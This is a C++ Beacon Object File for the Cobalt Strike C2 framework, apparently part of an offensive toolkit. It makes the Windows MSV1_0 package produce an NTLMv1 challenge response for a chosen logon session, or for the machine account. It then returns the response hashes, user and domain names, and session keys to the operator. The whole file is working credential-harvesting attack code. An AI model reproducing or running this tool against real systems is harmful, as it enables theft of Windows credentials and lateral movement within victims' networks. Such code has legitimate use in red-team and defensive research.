// Copyright (C) 2025 Evan McBroom
#include "boflib.cpp"

extern "C" __declspec(dllexport) void go(PCHAR buffer, ULONG length) {
    BeaconData beaconData;
    BeaconDataParse(&beaconData, buffer, length);
    MSV1_0_GETCHALLENRESP_REQUEST request;
    Libc::memset(&request, '\0', sizeof(request));
    request.MessageType = MsV1_0Lm20GetChallengeResponse;
    request.ParameterControl = USE_PRIMARY_PASSWORD;
    int dataSize;
    auto challengeToClientHex{ reinterpret_cast<char*>(BeaconDataExtract(&beaconData, &dataSize)) };
    Libc::memcpy(&request.ChallengeToClient, challengeToClientHex, sizeof(request.ChallengeToClient));
    if (BeaconDataLength(&beaconData) >= sizeof(int)) {
        request.LogonId.LowPart = BeaconDataInt(&beaconData);
    } else {
        request.ParameterControl |= GCR_MACHINE_CREDENTIAL;
    }
    Libc::CHAR_SPAN submitBuffer;
    submitBuffer.count = sizeof(request);
    submitBuffer.data = reinterpret_cast<char*>(&request);
    Libc::CHAR_SPAN returnBuffer;
    PIC_WSTRING(sspicli, L"SSPICLI.DLL");
    LAZY_LOAD_PROC(sspicli, LsaFreeReturnBuffer);
    PIC_STRING(msv1_0, MSV1_0_PACKAGE_NAME);
    if (LsaApi::CallPackage(msv1_0, &submitBuffer, &returnBuffer)) {
        auto response = reinterpret_cast<PMSV1_0_GETCHALLENRESP_RESPONSE>(returnBuffer.data);
        Libc::CHAR_SPAN span;
        span.count = response->CaseSensitiveChallengeResponse.Length;
        span.data = response->CaseSensitiveChallengeResponse.Buffer;
        auto hex = Hexlify(&span);
        PIC_STRING(message1, "CaseSensitiveChallengeResponse  : %s\n");
        BeaconPrintf(CallbackType::OUTPUT, message1, hex);
        span.count = response->CaseInsensitiveChallengeResponse.Length;
        span.data = response->CaseInsensitiveChallengeResponse.Buffer;
        hex = Hexlify(&span);
        PIC_STRING(message2, "CaseInsensitiveChallengeResponse: %s\n");
        BeaconPrintf(CallbackType::OUTPUT, message2, hex);
        PIC_WSTRING(nullptrString, L"UserName");
        UNICODE_STRING nullptrUString;
        nullptrUString.Buffer = const_cast<LPWSTR>(nullptrString);
        nullptrUString.Length = Libc::wcslen(nullptrUString.Buffer);
        nullptrUString.MaximumLength = nullptrUString.Length + 1;
        PIC_STRING(message3, "UserName                        : %wZ\n");
        BeaconPrintf(CallbackType::OUTPUT, message3, (response->UserName.Buffer) ? response->UserName : nullptrUString);
        PIC_STRING(message4, "LogonDomainName                 : %wZ\n");
        BeaconPrintf(CallbackType::OUTPUT, message4, (response->LogonDomainName.Buffer) ? response->LogonDomainName : nullptrUString);
        span.count = sizeof(response->UserSessionKey);
        span.data = reinterpret_cast<PCHAR>(response->UserSessionKey);
        hex = Hexlify(&span);
        PIC_STRING(message5, "UserSessionKey                  : %s\n");
        BeaconPrintf(CallbackType::OUTPUT, message5, hex);
        span.count = sizeof(response->LanmanSessionKey);
        span.data = reinterpret_cast<PCHAR>(response->LanmanSessionKey);
        hex = Hexlify(&span);
        PIC_STRING(message6, "LanmanSessionKey                : %s\n");
        BeaconPrintf(CallbackType::OUTPUT, message6, hex);
        (void)LazyLsaFreeReturnBuffer(returnBuffer.data);
    } else {
        PIC_STRING(message, "Failed to create an ntlmv1 response.\n");
        BeaconPrintf(CallbackType::ERROR, message);
    }
}